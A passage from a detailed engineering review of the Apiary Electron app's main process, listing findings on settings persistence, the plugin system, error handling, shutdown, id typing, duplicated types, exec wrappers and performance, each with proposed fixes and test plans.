  - Forgetting the merge line compiles fine, because `merged` starts with `...current` (`ipc.ts:251`). The field then silently cannot be changed from the UI.
  - `keep = (value, fallback) => value ?? fallback` (`:249`) also turns an explicit `null` into "unchanged", which is why `claudeBin` and `autoImportIntervalMinutes` are special-cased (`:253-257`). A generic `!== undefined` check is the correct rule for every field.
  - `saveSettings` writes in place with `writeFileSync` (`settings.ts:192-198`), while `ThemeStore.save` uses tmp + rename (`themeStore.ts:90-95`). A crash mid-write leaves invalid JSON. `loadSettings` then silently returns `DEFAULT_SETTINGS` (`settings.ts:186-188`), and the next window move persists those defaults. **The user's settings are lost.** The file is rewritten on every window move (MAIN-10). Same pattern in `sessionLayoutStore.ts:54-61`.
  - The `updateSkip` handler (`ipc.ts:487-492`) writes `updateSkippedVersion` although `UpdateService.skip()` already persisted it through the `saveSettings` callback (`updateService.ts:316`, `index.ts:372-377`).
- **What:** A `SettingsService` that owns the in-memory `AppSettings`:

  ```ts
  // shared/settings.ts (types only, so the payload can be derived)
  export interface AppSettings { … }                                   // moved from main/settings.ts
  export type AppSettingsPayload = Omit<AppSettings, 'schemaVersion' | 'windowBounds' | 'updateSkippedVersion'>

  // main/settings/settingsService.ts
  class SettingsService {
    constructor(file: string)                                           // load + migrate + write back once (CLAUDE.md)
    get(): Readonly<AppSettings>
    patch(p: Partial<AppSettings>): void                               // atomic write (tmp + rename), then notify
    applyPayload(p: Partial<AppSettingsPayload>): void                 // generic: for each PAYLOAD_KEY, if p[k] !== undefined → NORMALIZE[k]?.(p[k]) ?? p[k]
    onChange(fn: (next: AppSettings, prev: AppSettings) => void): () => void
  }
  const NORMALIZE: Partial<{ [K in keyof AppSettingsPayload]: (v: unknown) => AppSettings[K] }> = {
    recentSectionHours: clampRecentHours,
  }
  ```

  Each service subscribes to the fields it cares about (search, terminals, plugins, logging, updater, auto-import timer). `settingsGet` becomes `pick(settings.get(), PAYLOAD_KEYS)` plus the plugin info.
- **Why:** Removes the silent-drop failure mode, the corruption-to-defaults failure mode and repeated synchronous disk reads. Also puts each setting's side effect beside the code it affects.
- **Gain:** A new setting becomes: add it to `AppSettings`, to `DEFAULT_SETTINGS`, and (if it has a side effect) to one `onChange` subscriber. The payload type, get, merge and persist all follow automatically.
- **Implementation steps:**
  1. Make `saveSettings` and `saveSessionLayoutNow` atomic (tmp + `renameSync`, as in `ThemeStore`). This is an S change and can land first on its own.
  2. Move the `AppSettings` interface to `shared/settings.ts`. Derive `AppSettingsPayload` and add a type assertion test that it matches today's field list.
  3. Introduce `SettingsService` wrapping `loadSettings`/`migrateSettings`/`saveSettings` (keep those functions and their tests).
  4. Replace every `loadSettings(settingsFile)` call with `settings.get()` and every read-modify-write with `settings.patch()`. Remove the duplicate skip write.
  5. Replace the `settingsSet` literal with `applyPayload`, and the fan-out with `onChange` subscribers registered in the composition root.
- **Verification:** `npm test` (`settings.test.ts`, plus new tests: "a field the payload omits is unchanged", "an explicit null clears claudeBin", "a crash between write and rename keeps the old file"); `npm run test:component` (settings dialog); `npm run test:e2e -- settings update restoreWindows diagnostics`.
- **Constraints:**
  - CLAUDE.md "Changing a default reaches nobody": the migration plus the write-back at startup must stay.
  - "Settings arriving over IPC": missing means unchanged.
  - Only the first window persists `windowBounds`.
  - Theme options stay in `themes.json`.
- **Depends on:** none. MAIN-13 and MAIN-14 use it.

#### MAIN-17: The plugin system is closed at the edges: registration, per-plugin dependencies, shared context and ref resolution are all hardcoded

- **Category:** extensibility
- **Severity:** medium
- **Effort:** M
- **Evidence:**
  - **Registration is hardcoded** in the `AppService` constructor, with the default-on decided by a literal id: `this.plugins.register(createGitLabMrPlugin({ glabPath: options.glabPath }), options.plugins?.['gitlab-mr'] ?? true)` (`appService.ts:124-127`).
  - **Plugin-specific dependencies live in core options**: `glabPath` is in `AppServiceOptions` (`:55`) and `index.ts:434`.
  - **The context is minimal**: `PluginContext` is `{ cwd, branch }` (`plugins/types.ts:74-79`), so every plugin must shell out for the remote itself (`gitlabMr.ts:150`). A second (GitHub) plugin doubles the `git remote get-url` spawns per evaluation.
  - **Items hardcode their plugin id** instead of taking it from the plugin: `pluginId: 'gitlab-mr'` in `gitlabMr.ts:76,102`.
  - **The icon union is duplicated** in `plugins/types.ts:82-88` and `shared/api.ts:163`, and again in the renderer's drawing code.
  - **One TTL for all plugins** (`registry.ts:36`); plugins have no lifecycle hooks (no `dispose`) and the cache is never evicted (`registry.ts:43`, keyed by every cwd+branch ever seen; `revalidate()` re-runs *all* of them, `:93-99`).
  - **MR `!123` reference status is not part of the plugin system**: a dedicated `AppService.gitlabMrRefStatus` (`:737-752`), a dedicated IPC channel (`api.ts:217`), a module-singleton cache (`mrStatusCache.ts:30-33`) invalidated from `ipc.ts:115`. A GitHub `#123` equivalent would need a new channel, service method and cache.
  - Also: `gitlabMr.ts:114-115` says its `defaultExec` is "reused by the MR status cache", but `mrStatusCache.ts:50-53` defines its own.
- **What:**

  ```ts
  // plugins/types.ts
  export interface PluginDeps { exec: ExecFn; log: Logger; options: Record<string, string | undefined> } // e.g. { glabPath }
  export interface SessionBarPlugin {
    id: string; name: string; description?: string
    defaultEnabled?: boolean              // replaces the literal at appService.ts:126
    ttlMs?: number
    settings?: PluginSettingField[]
    evaluate(ctx: PluginContext, settings: PluginSettingValues): Promise<Omit<PluginBarItem, 'pluginId'> | null>  // registry stamps pluginId
    /** Optional: resolve inline references (e.g. `!123`, `#45`) found in titles/notes. */
    refs?: { pattern: RegExp; resolve(ctx: PluginContext, ids: string[]): Promise<Record<string, RefState | null>> }
    dispose?(): void
  }
  export interface PluginContext { cwd: string; branch: string | null; remoteUrl(): Promise<string | null> } // memoised per cwd by the registry
  // plugins/builtin.ts
  export const BUILTIN_PLUGINS: ((deps: PluginDeps) => SessionBarPlugin)[] = [createGitLabMrPlugin]
  ```

  Move `PluginIcon`, `PluginAction`, `PluginBarItem` and `PluginSettingField` into `shared/plugins.ts`, so main and renderer share one definition (MAIN-22). Replace `gitlabMrRefStatus` with a generic `pluginRefStatus(ref, pluginId, ids)` channel over `plugin.refs` (GitLab first, then GitHub).
- **Why:** Question 3(a): adding a GitHub PR plugin today touches `AppService`'s constructor, `AppServiceOptions`, `index.ts` and two copies of the icon union, and re-implements remote lookup. For ref badges it also needs a new IPC channel, service method and cache.
- **Gain:** A new session-bar plugin becomes: one file, plus one line in `BUILTIN_PLUGINS`, plus (only if it needs a new glyph) the icon union in one shared place and its renderer drawing.
- **Implementation steps:**
  1. Move the plugin payload types to `shared/plugins.ts` and re-export them from `api.ts`.
  2. Add `defaultEnabled` and the registry-stamped `pluginId`. Add a `BUILTIN_PLUGINS` array consumed by the composition root; drop the literal from `AppService`.
  3. Add a memoised `remoteUrl()` to the context (the registry builds it per lookup).
  4. Add registry cache eviction (drop entries not read for over 10 minutes) and a per-plugin `ttlMs`.
  5. Generalise ref resolution behind `refs`, migrate GitLab onto it, keep the old channel as an alias for one release, then remove it.
- **Verification:** `npm test` (`pluginBar.test.ts`, `mrStatusCache.test.ts`, `gitlabRemote.test.ts`); `npm run test:component`; `npm run test:e2e -- pluginBar mrStatus settings`.
- **Constraints:**
  - CLAUDE.md "Session-bar plugins": items are data from a closed icon/action set; URLs are re-checked in main; a throwing plugin contributes nothing; plugins are never on the render path; settings changes recompute in place rather than clear.
  - `glab`, not tokens.
- **Depends on:** MAIN-22; easier after MAIN-14.

#### MAIN-18: `~/.claude/projects` knowledge is spread over three modules (a light seam for a second data source)

- **Category:** extensibility
- **Severity:** low
- **Effort:** S (seam only)
- **Evidence:** The layout of the Claude projects directory is known in `appService.ts:259` (scan root), `appService.ts:596` (`encodeProjectDirName` to move a transcript), `ipc.ts:675-679` (watch root, depth 2), and `claudeSessionTracker.ts`/`ipc.ts:505` (`<configRoot>/sessions`). `SessionMeta` has no source field (`types.ts:2-15`), and `session_id` is a global primary key (`schema.ts:14`).
- **What:** Do not build a multi-source framework until a second source exists (YAGNI for a solo app). Do collect the Claude-specific knowledge into `sources/claudeProjects.ts`:

  ```ts
  export interface SessionSource {
    id: 'claude'
    scan(opts): Promise<SessionMeta[]>
    watch(onChange: (paths: string[]) => void): () => void
    transcriptPathFor(cwd: string, sessionId: string): string
  }
  ```

  `SessionCatalog` (MAIN-14) and `SessionWatcher` (MAIN-13) then depend on this interface. A second source later means a `source` column plus a second implementation.
- **Why:** Question 3(b). Today a second source needs edits in 4 files and a schema change with no seam to hang them on.
- **Gain:** The move/watch/scan rules for Claude's directory live in one reviewed file.
- **Implementation steps:** Create `ClaudeProjectsSource` wrapping `scanProjects`, the watcher config and `encodeProjectDirName`. Inject it into `AppService` (default: the Claude source). Keep `configRoot` handling in `config.ts`.
- **Verification:** `npm test` (`sessionScanner.test.ts`, `projectDirName.test.ts`, `appService.test.ts` move tests); `npm run test:e2e -- moveSession import`.
- **Constraints:** cwd comes only from inside the JSONL; `~/.claude/projects` stays read-only except for the documented move.
- **Depends on:** MAIN-1 (watcher paths), MAIN-13.

#### MAIN-19: Errors are handled inconsistently: unobserved rejections, unwrapped `ipcMain.on` listeners, theme channels outside the logging wrapper, and one spawn with no `error` listener

- **Category:** error-handling
- **Severity:** medium
- **Effort:** S
- **Evidence:**
  - **Unobserved rejections**, all `void …then(…)` with no `catch`: `ipc.ts:683` (watcher → `service.refresh()`), `index.ts:81` (periodic rescan), `index.ts:495` (menu rescan), `index.ts:283/285` (`loadURL`/`loadFile`).
  - **Startup is unguarded**: `void app.whenReady().then(async () => { … })` (`index.ts:386`). If `new SessionStore` throws (locked or corrupt DB, native ABI mismatch per CLAUDE.md's ABI trap) or `writeZshShim` throws (`index.ts:430`, unwritable userData), no window is ever created and nothing is logged or shown.
  - ESLint allows all of this: `'@typescript-eslint/no-floating-promises': ['error', { ignoreVoid: true }]` (`eslint.config.js:49`). There is no `process.on('unhandledRejection'|'uncaughtException')` anywhere in `src/main` (grep: none).
  - **The 6 `ipcMain.on` listeners are not wrapped** (`ipc.ts:144-151, 174-177, 495-499, 531-533`). A malformed `reportTabs` from a stale renderer throws a `TypeError` in `tabs.map` (`:149`), which is an uncaught main-process exception. `index.ts:210-214` describes what that does: "took the whole main process down with a native error dialog".
  - **`themeIpc.ts` registers 10 channels directly** (`:31-78`), so their failures skip `handle()`'s logging. That contradicts CLAUDE.md line 546 ("every IPC rejection" is logged).
  - **`openInVsCode` spawns with no `'error'` listener**: `spawn(codePath, [folder], { detached: true, stdio: 'ignore', shell: false })` (`detectVsCode.ts:66`). An `ENOENT`/`EACCES` (VS Code uninstalled since launch) is emitted asynchronously on a ChildProcess with no listener, which throws: an uncaught main-process exception.
  - **Error shape across IPC** is thrown `Error` → a string wrapped by Electron (`renderer/errors.ts:11-13` strips it). The only structured outcome is `CheckoutOutcome` (`types.ts:149-151`). Expected outcomes such as "not a git repository" (MAIN-9) and "session is still running" (`appService.ts:563,584`) are thrown, so the renderer cannot branch on them without parsing prose.
- **What:**
  1. A `fireAndForget(promise, scope)` helper in `log/` that attaches `.catch(e => log.warn(scope, 'background task failed', { error }))`. Replace every `void x.then(...)` on main.
  2. Wrap the `whenReady` body in `try/catch` → `log.error` + `dialog.showErrorBox('Apiary could not start', message)` + `app.quit()`.
  3. Register `process.on('unhandledRejection')` and `process.on('uncaughtException')` in `index.ts`, logging with `log.error` (the diagnostic log exists for exactly this; CLAUDE.md's "Open installer" story).
  4. Route all `ipcMain.on` listeners through an `on()` wrapper with `try/catch` + log, and all theme handlers through `handle()`. Both happen automatically with MAIN-11's registrar.
  5. `child.on('error', e => log.warn('vscode', 'launch failed', { error: e.message }))` in `openInVsCode`. Optionally, have it return a `Promise` that rejects on `error` before `spawn`, so the renderer sees the failure.
  6. Optional, later: for renderer-actionable outcomes, prefer result unions (`{ ok: false, reason: 'running' | 'not-a-repo' | … }`) following `CheckoutOutcome`, rather than error codes smuggled in messages.
- **Why:** Failures today are invisible, or crash the process, in exactly the places the diagnostic log was built to explain.
- **Gain:** No silent startup failure, no crash on bad input from a stale renderer, and the diagnostic log records every background failure.
- **Implementation steps:** Items 1-5 above, one commit each. Add a lint rule forbidding `void` on anything other than `fireAndForget(...)`, or accept a code-review convention.
- **Verification:**
  - `npm test`: new unit test "a background refresh that rejects is logged, not dropped" (inject a throwing service into `SessionWatcher`), and "openInVsCode reports a missing binary" (inject a `spawn` that emits `error`; `detectVsCode.test.ts` already injects `spawn`).
  - `npm run test:e2e -- openInVsCode diagnostics errorReporting appBoots`.
- **Constraints:** Logger rules (CLAUDE.md "The diagnostic log"): off means nothing is written, no conversation content, redaction inside the logger, and the logger itself never throws.
- **Depends on:** MAIN-11 for item 4 (otherwise do it by hand in `ipc.ts`).

#### MAIN-20: Quit does not stop everything it started

- **Category:** correctness
- **Severity:** low
- **Effort:** S
- **Evidence:**
  - `shutdown()` (`index.ts:552-593`) calls `disposeIpc()` and `service.dispose()`. `disposeIpc` (`ipc.ts:688-696`) clears two timers, closes the watcher and removes handlers, but:
    - never calls `sessionTracker.stop()` (its interval is unref'd, but keeps polling and `send`ing until exit, `ipc.ts:512`);
    - never removes the `app.on('browser-window-focus', …)` listener (`:554`) or the `tabRegistry.onChange`/`pty.onData`/`pty.onExit` subscriptions (`:640-641, 669-671`). `PtyManager` and `TabRegistry` have no unsubscribe at all (`ptyManager.ts:84-85`, `tabRegistry.ts:29`).
  - `AppService.dispose` never calls `searchClient.close()` (`searchClient.ts:79-83`, never called), so the worker's SQLite handle is left to process exit.
  - `updater.stop()` is never called.
  - **An in-progress theme generation outlives the app**: the child is spawned `detached: true` into its own process group (`themeGenerator.ts:79-80`), and nothing on the quit path calls `generator.cancel()`. So `claude -p` keeps running, and spending tokens, after Apiary has quit.
- **What:** Make every long-lived component `Disposable`. Have the composition root (MAIN-15) dispose them in reverse order: `themeGenerator.cancel()`, `updater.stop()`, `sessionTracker.stop()`, watcher, IPC, services (`searchClient.close()` inside `SearchService.dispose`), then the store. Have `onData`/`onExit`/`onChange` return an unsubscribe function.
- **Why:** Orphaned processes and resource leaks. It also matters for any future in-process restart or re-registration (for example a second `registerIpc` in tests), where the subscriptions would double up.
- **Gain:** A clean quit, and no background token spend after quit.
- **Implementation steps:**
  1. Add `generator.cancel()` and `updater?.stop()` to `shutdown()` before `disposeIpc`.
  2. Add `sessionTracker.stop()` and the focus-listener removal to `disposeIpc`.
  3. Add `this.searchClient?.close()` to `AppService.dispose()`.
  4. Change `onData`/`onExit`/`onChange` to return an unsubscribe function, and use it in dispose.
- **Verification:** `npm test` (`themeGenerator.test.ts`: add "quitting cancels a generation in progress" via a stub shell; `appService.test.ts` dispose); `npm run test:e2e -- appBoots themeGenerator restoreWindows` (the Harness already checks that the process exits).
- **Constraints:** Shutdown order and the bounded pty wait (`index.ts:517-524`, `ptyManager.ts:361-377`). Quit must never become impossible (`index.ts:541-548`).
- **Depends on:** none (cleaner with MAIN-15).

#### MAIN-21: Pty and session identifiers are stringly-typed and minted and parsed in eight places; `(key, isPtyId)` is a redundant pair

**Lead review:** Canonical for the pty and tab id helpers. It absorbs UI-17 and the pty-id part of SHARED-3.

- **Category:** types
- **Severity:** medium
- **Effort:** M
- **Evidence:**
  - **Minted** in main at `appService.ts:687` (`` `shell:${sessionId}:${tabId}` ``), `:706`, `:939` and `:960` (`` `new:${randomUUID()}` ``), and in the renderer at `SessionColumn.tsx:252`, `:351`, `:720` and `:725`.
  - **Parsed** in the renderer at `App.tsx:455` (`id.startsWith('new:')`) and `App.tsx:466` (`/^shell:(.+):([^:]+)$/`, with a comment explaining the greedy group because a key can itself contain a colon).
  - **Seventeen `ApiaryApi` methods take `(key: string, isPtyId: boolean)`** (`api.ts:447-491`). `isPtyId` is computed as `pending.has(key) || ptyOverrides.has(key)` (`SessionColumn.tsx:143-146`), which in practice is exactly "the key is a `new:` id", so the boolean restates what the string already encodes and can disagree with it.
  - The trust check itself is right (`appService.ts:655-660`), but a wrong flag silently looks the key up in the wrong table.
- **What:** Add `src/shared/ptyId.ts`, a pure helper shared by both sides (CLAUDE.md Conventions: helpers wanted on both sides live in `shared/`):

  ```ts
  export type SessionId  = string & { readonly __brand: 'SessionId' }
  export type PendingPtyId = `new:${string}`
  export type ShellPtyId   = `shell:${string}:${string}`
  export type PtyId = SessionId | PendingPtyId | ShellPtyId
  export type TerminalRef = { kind: 'session'; sessionId: SessionId } | { kind: 'pending'; ptyId: PendingPtyId }

  export const newPendingId = (uuid: string): PendingPtyId => `new:${uuid}`
  export const shellId = (owner: SessionId | PendingPtyId, tab: string): ShellPtyId => `shell:${owner}:${tab}`
  export function parsePtyId(id: string):
    | { kind: 'shell'; owner: string; tab: string }
    | { kind: 'pending'; uuid: string }
    | { kind: 'session'; sessionId: string } { … }          // the one regex, tested once
  export const refFor = (key: string): TerminalRef => key.startsWith('new:') ? { kind: 'pending', ptyId: key as PendingPtyId } : { kind: 'session', sessionId: key as SessionId }
  ```

  Then change the 17 `(key, isPtyId)` signatures to `(ref: TerminalRef)`, validated in the IPC registrar (MAIN-11). `resolveShellCwd` switches on `ref.kind`.
- **Why:** An id convention used by two processes should have one definition. Template-literal types catch a malformed mint at compile time at zero runtime cost.
- **Gain:** One place to change the id scheme; the `isPtyId` flag can no longer disagree with the key; 17 fewer boolean parameters.
- **Implementation steps:**
  1. Add `shared/ptyId.ts` plus `tests/unit/ptyId.test.ts` (including a `new:` owner inside a `shell:` id).
  2. Replace the 8 mint sites and 2 parse sites with the helpers (no behaviour change).
  3. Change `resolveShellCwd(key, isPtyId)` to `resolveCwd(ref)` in main, with the old signature delegating.
  4. Migrate the `ApiaryApi` methods to `TerminalRef` one domain at a time, updating the preload, `fakeApiary.ts` and the renderer call sites.
- **Verification:** `npm run typecheck`; `npm test`; `npm run test:component`; `npm run test:e2e -- multiTerminal newSession forkSession sessionFollowing gitToolbar pluginBar detachTab`.
- **Constraints:**
  - The renderer never supplies a path: `TerminalRef` carries ids only.
  - Shell ids stay `shell:<session key>:<n>` (CLAUDE.md Layouts), and `keyFor` stays `ptyOverrides.get(key) ?? key` (CLAUDE.md "Which session a terminal is on").
  - `buildResumeCommand` keeps its UUID check.
- **Depends on:** MAIN-11 (for the signature change); steps 1-2 are independent.

#### MAIN-22: Types are duplicated between main and shared as "mirrors"

**Lead review:** Same work as SHARED-2, which adds `AppSettings extends AppSettingsPayload` and moving `THEME_MODELS` to shared.

- **Category:** types
- **Severity:** low
- **Effort:** S
- **Evidence:**

  | Duplicated type | Main-side definition | Shared/API definition |
  | --- | --- | --- |
  | Update status and phase | `UpdateStatus`, `updateService.ts:38-61` | `UpdateStatusPayload`, `api.ts:74-92` ("Mirrors … kept structural") |
  | Plugin bar item | `PluginBarItem`, `plugins/types.ts:97-113` | `PluginBarItemPayload`, `api.ts:159-168` |
  | Plugin setting field | `PluginSettingField`, `plugins/types.ts:33-51` | `PluginSettingFieldPayload`, `api.ts:95-98` |
  | MR state | `MrState`, `mrStatusCache.ts:7` | inline in `api.ts:453` |
  | Log level | `LogLevel`, `logger.ts:30` | inline in `api.ts:389` |
  | Log status | `LogStatus`, `logger.ts:42-47` | `LogStatusPayload`, `api.ts:67-72` |
  | Open-installer result | `OpenInstallerResult`, `updateService.ts:18-21` | inline in `api.ts:88` and `:517` |
  | Reported tab | `OpenTab`, `tabRegistry.ts:5-16` | inline in `api.ts:318` and `ipc.ts:146` |
  | Theme model | `ThemeModel`, `themeGenerator.ts:12-13` | widened to `string` in `ThemeOptions.model` (`api.ts:128`), which is why `themeIpc.ts:75` needs `as ThemeModel` |

  The justification ("avoid the renderer importing main-process code") is solved by moving the type into `shared/`, which main is allowed to import (the ESLint area rules only forbid shared→main and renderer→main).
- **What:** Create `shared/update.ts`, `shared/plugins.ts`, `shared/log.ts` and `shared/tabs.ts` (types plus pure constants such as `THEME_MODELS`). Make both `main/*` and `api.ts` import from them. Delete the mirrors.
- **Why:** Mirrors drift silently. Nothing checks that `UpdateStatusPayload` still matches `UpdateStatus`, and `ipc.ts:478-479` returns one as the other through structural typing.
- **Gain:** One definition per concept; `as` casts disappear.
- **Implementation steps:** One commit per type family: move, re-export under the old name, fix imports, delete the alias.
- **Verification:** `npm run typecheck`, `npm run lint` (area rules), `npm test`, `npm run test:component`.
- **Constraints:** `tsconfig.node.json` has no DOM lib, so the new shared files must be pure (CLAUDE.md Conventions).
- **Depends on:** none (MAIN-17 uses it).

#### MAIN-23: Seven hand-rolled `execFile` wrappers with different timeouts, buffers and error shapes

- **Category:** modularity
- **Severity:** low
- **Effort:** S
- **Evidence:** `promisify(execFile)` appears in:

  | File | Timeout | maxBuffer | Error handling |
  | --- | --- | --- | --- |
  | `worktreeResolver.ts:7,14-21` | 5 s | default | swallowed to `null` |
  | `branchOps.ts:5,10-25` | 15 s | default | stderr + stdout merged into the thrown message |
  | `liveSessionDetector.ts:4,34-37` | 5 s | 8 MB | |
  | `mrStatusCache.ts:5,50-53` | 8 s | 1 MB | |
  | `gitlabMr.ts:8,116-119` | 8 s | 8 MB | |
  | `detectVsCode.ts:5,20-23` | 5 s | default | |
  | `update/macSignature.ts` | | | |

  Three of these already take an injectable `exec?:` seam with the same `(file, args, cwd) => Promise<string>` signature (`mrStatusCache.ts:58`, `gitlabMr.ts:29`, `detectVsCode.ts:16`). None of them logs spawn failures or durations.
- **What:** Add `main/exec/run.ts` exporting `type ExecFn = (file, args, opts: { cwd?, timeoutMs?, maxBuffer? }) => Promise<string>` and a `defaultExec` that normalises errors (the `branchOps` stderr/stdout merge) and logs slow or failed spawns at debug level. Inject it via the composition root. Tests pass fakes, as they already do.
- **Why:** Question 3(d) friction: a new git operation re-decides timeout and error formatting. It also gives one place to add counting (useful for measuring MAIN-1, MAIN-3 and MAIN-9).
- **Gain:** Consistent errors and timeouts; spawn metrics for free.
- **Implementation steps:** Add `run.ts` with its tests. Migrate `gitlabMr` and `mrStatusCache` first (they already use the seam), then `branchOps`/`worktreeResolver` (keeping their null-vs-throw semantics as thin wrappers), then the rest.
- **Verification:** `npm test` (`branchOps.test.ts`, `worktreeResolver.test.ts`, `mrStatusCache.test.ts`, `detectVsCode.test.ts`, `liveSessionDetector.test.ts`).
- **Constraints:** `execFile` with argument arrays only, never a shell string (the security rule in CLAUDE.md and `detectVsCode.ts:60-62`).
- **Depends on:** none.

#### MAIN-24: Transcript and search reads do more I/O than they keep

**Lead review:** The `readSearchText` cap is SEC-12 step 1; implement it once.

- **Category:** performance
- **Severity:** low
- **Effort:** S
- **Evidence:**
  - `indexTranscript` (`transcriptReader.ts:28-80`) re-streams the **whole file** whenever `mtime`/`size` changed (`:33`). A live session appends constantly, so every page load of a running session rescans the entire JSONL, although the file is append-only.
  - The offset cache `cache` (`:18`) is never evicted: one offsets array per transcript ever opened.
  - `readSearchText` (`indexer.ts:37-52`) accumulates the extracted text of the **entire** file and then `put` truncates it to 2 MB (`searchIndex.ts:35,135`), so for a tens-of-MB transcript the transient memory and read time are paid in full for text that is thrown away.
  - `index.put` of up to 2 MB into FTS5 is a synchronous tokenisation on the main thread. The cost is unmeasured.
- **What:**
  - When `size > hit.size`, continue indexing from `hit.size` (the append-only fast path). Fall back to a full scan if the file shrank.
  - Cap the transcript cache (LRU of ~50 files).
  - Stop `readSearchText` once `MAX_TEXT_PER_SESSION` characters are collected (close the reader early).
  - Before changing anything about `put`, log its duration when it exceeds 50 ms (measure first).
- **Why:** Less main-thread and disk work for the sessions people actually have open.
- **Gain:** O(appended bytes) per page load of a live session; bounded memory.
- **Implementation steps:** Three independent edits, each with a unit test: "an appended transcript is indexed incrementally and pages identically"; "indexing stops reading at the cap".
- **Verification:** `npm test` (`transcriptReader.test.ts`, `searchIndex.test.ts`, `searchLoad.test.ts`); `npm run test:e2e -- transcript search`.
- **Constraints:** CLAUDE.md Search: indexing stays incremental, on the main thread, yielding between files. The per-session cap semantics stay.
- **Depends on:** none.

#### MAIN-25: Watcher configuration is broader than what the scanner reads

- **Category:** performance
- **Severity:** low
- **Effort:** S
- **Evidence:**
  - `watch(projectsDir(configRoot), { depth: 2, ignoreInitial: true, awaitWriteFinish: { stabilityThreshold: 500, pollInterval: 100 } })` (`ipc.ts:675-679`), with no `ignored`.
  - The scanner only ever reads `<projects>/<slug>/*.jsonl` (`sessionScanner.ts:108-116`), which is depth 1. So any file at depth 2 (inside a per-session subdirectory) triggers a full refresh.
  - On Linux, each watched directory costs an inotify watch, and depth 2 adds one per session subdirectory. A large library can approach `fs.inotify.max_user_watches` on older distributions.
  - `awaitWriteFinish` polls `stat` every 100 ms per actively-written file.
- **What:** `depth: 1` and `ignored: (path, stats) => stats?.isFile() === true && !path.endsWith('.jsonl')`, so only transcript add/change/unlink trigger. Before narrowing, check against a real current Claude Code install whether anything else at depth 2 should trigger a rescan. Nothing in the scanner reads it today.
- **Why:** Fewer spurious full rescans (until MAIN-1 makes them cheap) and fewer OS watches.
- **Gain:** Rescans only for transcript changes.
- **Implementation steps:** Change the options, and add an e2e assertion in `sessionFollowing.spec.ts` that a non-JSONL write does not emit `treeChanged` (use `expectStays`).
- **Verification:** `npm run test:e2e -- sessionFollowing newSession import`.
- **Constraints:** New session files must still appear without a restart.
- **Depends on:** MAIN-13 (watcher extraction makes it testable in Node).

#### MAIN-26: Every pty chunk is one IPC message to every window

**Lead review:** Re-verified the broadcast (`ipc.ts:106-110, 640`). The renderer half (one `ptyBus` subscription) is UI-10.

- **Category:** performance
- **Severity:** low
- **Effort:** M
- **Evidence:** `service.pty.onData((id, data) => send(CHANNELS.ptyData, id, data))` (`ipc.ts:640`) sends each node-pty chunk to every window, whether or not that window shows the pty (`ipc.ts:106-110`). node-pty emits many small chunks for TUI repaints. With three windows open, each chunk is serialised three times.
- **What:** Two independent refinements, both keeping the documented "a pty belongs to main, several windows may show it" model:
  1. Coalesce per pty per tick: buffer chunks and flush on `setImmediate`, or at 4-8 ms, as VS Code's terminal does.
  2. Have each window declare which pty ids it has attached views for (a `ptyAttach`/`ptyDetach` send from `TerminalView`), and have main send `ptyData` only to those windows.
- **Why:** IPC and serialisation cost scales with windows × output rate.
- **Gain:** Fewer IPC messages under heavy output; windows that don't show a pty pay nothing for it.
- **Implementation steps:** Do (1) first (main-only change). Measure with `tests/e2e/bench/themePerf.spec.ts`'s terminal-typing case before and after. Do (2) only if the measurement warrants it (it needs renderer changes).
- **Verification:** `npm run test:e2e -- terminal multiTerminal multiWindow detachTab`; `APIARY_BENCH=1 npm run test:e2e -- bench/`.
- **Constraints:**
  - Broadcast rationale at `ipc.ts:97-105`.
  - The snapshot-then-resize ordering (CLAUDE.md), which must not regress: the flush must preserve chunk order.
  - Activity coalescing still observes each chunk (`ipc.ts:670`).
- **Depends on:** MAIN-12.

---

### Verified OK (keep as is)

- **Central IPC wrapper** (`ipc.ts:58-95`): times every handler, logs slow (>2 s) and failed calls at `warn`, and rethrows. This is the right shape; MAIN-11 extends it to theme and `on` channels rather than replacing it.
- **Trust boundary:**
  - `resolveShellCwd`/`requireFolder`/`requireSession`/`requireWorktreeFor` (`appService.ts:655-660, 854-859, 971-975, 793-801`);
  - `listedWorktrees` accepts only paths git reported (`:868-874, 899`);
  - `buildResumeCommand`'s UUID check (`resumeCommand.ts:16`);
  - `readImage` confinement (`appService.ts:1058-1073`);
  - plugin URLs re-checked before `openExternal` (`ipc.ts:419-437`).
- **The refresh reentrancy design** (`appService.ts:202-312`): join in flight plus a single pending rerun, `disposed` checked between every stage, and a rejection that doesn't wedge future refreshes.
- **Update service architecture**: all policy behind `UpdateBackend` with injectable timers (`updateService.ts:69-111`), re-armed timeouts instead of `setInterval`, and capability decided up front.
- **`PluginRegistry`** (`registry.ts`): per-plugin fault containment, in-flight dedupe that joins rather than returning stale data, stale-while-revalidate, and revalidate-in-place on settings change.
- **`ScreenBuffers` and snapshot** (`screen.ts`): rendered-screen classification and snapshot catch-up, the documented fix for two shipped bugs.
- **Quit path**: `before-quit` deferral with the `shutdownFinished` guard against a second quit (`index.ts:525-550`), `try/finally` so quit can never be blocked, bounded `killAll` (`ptyManager.ts:361-377`), and the per-window bounded layout flush (`index.ts:570-585`, `layoutFlushCoordinator.ts`).
- **Search**: FTS in its own rebuildable DB with WAL + NORMAL (`searchIndex.ts:81-115`), `toMatchQuery` plus the prefix minimum, the worker with the `null` vs `[]` distinction (`searchClient.ts:62-77`), and incremental size/mtime indexing that yields between files (`indexer.ts`).
- **`SessionStore.syncSessions`**: omits `cwd_override`/`project_path`, is transactional, and reuses one prepared statement inside its loop (`sessionStore.ts:116-164`). Also the idempotent `PRAGMA table_info` migrations (`:85-96`).
- **Pure, Electron-free modules** with injected seams: `sessionLayoutStore.ts`, `layoutFlushCoordinator.ts`, `tabRegistry.ts` (with `focusTab` kept out of the class), `claudeRename.ts` (`RenameDeps`), `claudeSessionTracker.ts` (`TrackerOptions`), `windowAtPoint.ts`, `navigationGuard.ts` (`decideNavigation` pure).
- **Activity broadcast coalescing** with leading and trailing edges (`ipc.ts:643-671`).
- **`branchOps.git()`**: surfaces stderr and stdout with a `cause`; `worktree list --porcelain` parsing (`branchOps.ts:10-25, 112-136`).
- **`ThemeStore`**: validates on every load and save, with atomic tmp+rename writes (`themeStore.ts:44-95`). `themeIpc.ts` treats every argument as `unknown`; that is the model for MAIN-11's guards.
- **Logger**: inert when off, redaction inside, never throws (`logger.ts:134-154`); Electron kept out via `configure.ts`.
- **`childEnv`**: explicit marker list (`childEnv.ts:19-33`).

### Suggested order of work

Each step keeps `npm run typecheck`, `npm test`, `npm run test:component` and `npm run test:e2e` green.

1. **Quick, independent wins (S each, any order):**
   - MAIN-16 step 1 (atomic `settings.json`/`session-layout.json` writes);
   - MAIN-19 items 1-3 and 5 (catch background rejections, guard startup, process-level net, VS Code `error` listener);
   - MAIN-20 (cancel theme generation and stop the tracker/updater on quit);
